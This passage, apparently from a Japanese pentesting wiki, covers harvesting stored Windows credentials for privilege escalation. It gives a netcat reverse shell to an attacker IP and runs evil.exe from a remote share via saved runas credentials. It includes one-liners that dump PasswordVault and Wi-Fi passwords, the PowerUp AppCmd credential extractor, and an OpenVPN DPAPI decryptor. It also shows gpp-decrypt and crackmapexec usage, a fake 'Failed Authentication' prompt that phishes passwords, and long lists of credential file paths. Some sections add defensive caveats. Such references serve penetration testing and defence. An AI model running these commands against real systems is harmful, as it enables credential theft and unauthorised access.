runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使って `runas` を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用します。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にdumpして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API（DPAPI）**は、データを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵を対称暗号化するために使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

**DPAPIは、ユーザーのログインシークレットから導出される対称鍵を使って、鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPIを使用して暗号化されたユーザーのRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで、`{SID}`はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに格納されているDPAPIキー**は、通常、64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMDの`dir`コマンドでは内容を一覧表示できませんが、PowerShellでは一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** の `dpapi::masterkey` を使用すると復号できます。

**master password で保護された credentials files** は通常、次の場所にあります：

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使って復号できます。\
（root 権限があれば）`sekurlsa::dpapi` module を使って、**memory** から多数の **DPAPI** **masterkeys** を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使われます。credentials は **DPAPI** で保護されており、通常は作成時と同じコンピューター上の同じユーザーでのみ復号できます。

エクスポートされた credential のファイル名や `.xml` のパスは任意です。スクリプトやファイルの一覧でファイルが見つかった場合は、`C:\Users` にあると決めつけず、アカウントの実際のプロファイルディレクトリを特定してください。[Windows ではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手がかりにすぎません。[Windows の `Export-Clixml` は、暗号化された credential をエクスポートしたユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元されたアカウントが対象サービスで有効な権限を持っているかは、別途確認する必要があります。通常の列挙では、暗号化値や平文値を出力せずに、まずパスと ACL を確認してください。

ファイルに含まれる PS credentials を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

以下にあります: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` モジュールを適切な `/masterkey` とともに使用して、**.rdg ファイルを復号**します。\
Mimikatz の `sekurlsa::dpapi` モジュールを使うと、メモリから多くの DPAPI masterkey を**抽出**できます。

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある、`config.xml` のような一般的な名前のファイルも含め、読み取り可能な XML を調べてください。XML ファイルを認証情報の手がかりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタムの master password が使われたかどうかによって異なります。広範な列挙の際に、暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有の管理フォルダーにある場合があります。旧形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を持つ `Data/Profile` エントリがあります。空でない password 要素は、出力したり平文だと決めつけたりせず、認証情報の手がかりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成元のアカウントとコンピューターに紐付けられる場合と、より制限の緩い設定にできる場合があります。これを信頼する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

パスワードなどの情報を付箋アプリに保存している人もいます。Microsoft のパッケージ版 Sticky Notes アプリは、一般に `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にノートを保存します。古いアプリや別のアプリでは、LevelDB など、他のユーザープロファイル内のストアを使う場合があります。SQLite ファイルが見つからないからといってノートがないと判断する前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite の write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたノートが含まれないことがあります。データベースを整合性のある状態でコピーし、対応する `plum.sqlite-wal` も一緒に保管してください。利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL に関するドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むノートは認証情報の手がかりにすぎません。アカウント、許可されたアクセス、パスワードの使い回しをそれぞれ別途確認してください。暗号化されたパスワードマネージャーのレコードから、より高い権限のログイン情報を特定するには、実際の復号キーとアプリ固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator 権限が必要で、High Integrity レベルで実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました。

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください。\
インストーラーは **SYSTEM 権限で実行されるため、多くが** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc) **からの情報によると、DLL Sideloading に対して脆弱です。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

古いリモートサポート製品のインストール環境では、固定のアプリケーションレジストリキーの下に、パスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` はバージョン 9 より前では、設定済みの固定セッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データ、その形式、現在の認証動作を確認してください。リモートサポート用パスワードから、より高い権限を持つ Windows アカウントへの昇格には、そのアカウントで実際に同じパスワードが使われており、そのアカウントへのアクセスが許可されていることも必要です。日常的な列挙の出力に、暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウント情報が含まれている疑いがある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoft の説明](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)によると、ワークシートの保護は編集を制限するものであり、セキュリティ機能ではありません。これだけでは、ブックの内容が暗号化されているとは判断できません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限は、それぞれ別途確認してください。

### CI サーバーに残る変更パッチ

CI サーバーは、ビルドの完了後も、送信されたソースコードの変更をデータディレクトリに保持していることがあります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` をリモート実行の変更を保存する場所として説明しています。データディレクトリは設定可能であり、必ずしも `ProgramData` の下にあるとは限りません。読み取り可能なパッチには、削除または追加された認証情報ファイルや暗号化キーへの参照、あるいはその両方を使用するスクリプトが残っている場合があります。たとえば、PowerShell の `ConvertTo-SecureString -Key` ワークフローでは、暗号化文字列に加えて AES キーが必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、このキーは別途指定します。まずアクセス可能なパッチ名だけを確認し、許可を得たうえで関連する内容を調べ、日常的な列挙の出力に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や高い権限でのアクセスは証明できません。データディレクトリの ACL を制限し、ビルドの変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自に作成されたパスワードローテーターは、ローカル管理者のパスワードを暗号化してローカルサービスに保存し、データストアの認証情報を読み取り可能な `.env` ファイルまたはアップデーターのバイナリと同じ場所に置いていることがあります。アップデーターのスケジュールされたタスク、アカウント、設定ファイルの ACL、リスナー、データストアの権限をまとめて確認してください。ループバックのみで待ち受けるデータストアでも、有効な認証情報を持つローカルユーザーからアクセスできますが、認証に成功しただけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文の隣から取得できる場合は、その暗号化を信頼する前に、正確なキー導出方法を確認してください。公開されたシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Go のドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを昇格経路として扱う前に、そのパスワードが現在も有効であり、ローカルの Administrators グループに属するアカウントのものであることを確認してください。スケジュールされたタスク、`.env` のパス、暗号化されたデータだけでは、これらの条件は証明できません。日常的な列挙の出力に、パスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra による保存とアクセス制御は、カスタムのローカルデータストアとは別のものです。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Java サーバープラグインのアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されます。読み取り可能なカスタムプラグインには、設定やバイトコードにサービス認証情報が埋め込まれていることがあります。許可されている場合にのみアーカイブを確認し、復元した秘密情報を日常的な列挙の出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明できません。また、サービスパスワードを復元できても、より高い権限を持つアカウントでも有効でなければ、権限昇格にはつながりません。該当ファイルの ACL を確認し、使い回された認証情報は別々の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使用する Openfire 環境では、`openfire.script` が `Openfire\embedded-db` の下に保存されていることがあります。現在のアカウントで読み取り可能な場合は、`OFUSER` レコードと `passwordKey` プロパティを併せて確認してください。Openfire の[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードはプレーンテキストで保存することも、そのプロパティに保持されるキーで暗号化することもできます。復元したパスワードが権限昇格に関係するのは、より高い権限を持つ ID に対して現在も有効な場合に限られます。ファイル名だけでは、読み取り可能であることも、認証情報が再利用されていることも証明できません。このパスは調査対象の手がかりであるため、日常的な列挙の出力にデータベースの内容や認証情報を含めないでください。

別ファイルの `Openfire\conf\openfire.xml` からは、外部データベースを使用している場合でも、管理コンソールの設定ポートとバインドインターフェイスがわかることがあります。Openfire は通常、管理コンソールをループバックにバインドしますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスに到達できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfire サービスの実行 ID をまとめて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスが LocalSystem として実行されている場合、その権限は非常に高い可能性があります。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行は証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

一般に `server.config.yaml` という名前の Velociraptor サーバー設定には、内部 CA の `CA.private_key` が含まれていることがあります。権限の低いユーザーがそのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。それによって権限が高まるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントの実行 ID によって異なります。クライアント設定には別の情報が含まれます。クライアント設定が見つかっても、サーバー CA にアクセスできるとは限りません。CA の秘密鍵をオフラインで保管する環境もあるため、サーバー設定が読み取り可能でも署名鍵が含まれていない場合があります。

Windows サーバーでは、インストールディレクトリにある**サーバー**設定ファイルと、保護されたバックアップの ACL を確認してください。場所の例として `%ProgramFiles%\VelociraptorServer\server.config.yaml` がありますが、異なる場合はサービスに設定されたパスを使用してください。現在の ID でファイルを読み取れることと、`CA.private_key` が実際に含まれていることを確認してください。ログや列挙の出力に秘密鍵を表示しないでください。ベンダーの `config api_client` ワークフローでは CA キーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込み権限や再起動が必要になる場合があります。これらの書き込みができなくても、既存の特権サーバー ID が経路となることがあります。実行権限を伴う API クエリは、該当するサーバーまたはエージェントのコンテキストで実行されるため、非常に高い権限を持つ場合があります。

サーバー設定とバックアップは制限的な ACL で保護し、可能な場合は CA 署名鍵をオフラインで保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)および[セキュリティ設定のガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty の認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートされたセッションのバックアップは`sessions-backup.dat`という名前で、別の場所に保存されていることがあります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートはパスワードで暗号化されており、セッション、キー、スクリプト、タグ、関連付けが含まれる場合があります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルが見つかっても、そのパスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことが証明されるわけでもありません。

### PuTTY SSHホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内のSSHキー

SSH秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリがあれば、保存された SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始するようにしたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この technique はもう有効ではないようです。SSH key を作成し、`ssh-add` で追加してから、SSH 経由でマシンにログインしようとしました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも、非対称鍵認証中に `dpapi.dll` が使用された形跡は確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

サンプルコンテンツ:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` hive が含まれている場合もあります。ローカルからアクセス可能なバックアップまたはイメージのディレクトリを優先し、何かを展開する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけでは hive が露出している証拠にはならず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検知につながりやすい対象です。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** というファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存された Group Policy Objects (GPO) は、ドメインユーザーなら誰でもアクセスできました。第二に、GPP 内のパスワードは、公開されている既定のキーを使って AES256 で暗号化されていましたが、認証済みユーザーなら誰でも復号できました。そのため、ユーザーが昇格した権限を取得するおそれがあり、深刻なリスクとなっていました。

このリスクを軽減するため、空でない「cpassword」フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP の詳細とファイルの場所が含まれ、セキュリティ上の脆弱性の特定と修正に役立ちます。

次のファイルを、`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista より前)_ で検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec を使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS の webroot 内のバックアップアーカイブ

公開対象の webroot に直接置かれた古い ZIP バックアップから、以前の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。露出と判断する前に、サイトに設定された物理パスと、アーカイブが実際に HTTP 経由でアクセス可能かどうかを確認してください。既定の `C:\inetpub\wwwroot` は候補の1つにすぎません。アーカイブを開かずに、名前とサイズを一覧表示する簡単なローカル調査ができます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、取得した認証情報でより高い権限を得られることも証明できません。

### OpenVPN の認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、いつでも**ユーザー自身の認証情報や、別のユーザーの認証情報を入力するよう尋ねる**ことができます（ただし、クライアントに直接**認証情報**を尋ねるのは、非常に**危険**です）。

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことがある既知のファイル Renders

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般的に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の利用が可能であるとは限りません。保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを確認してください。

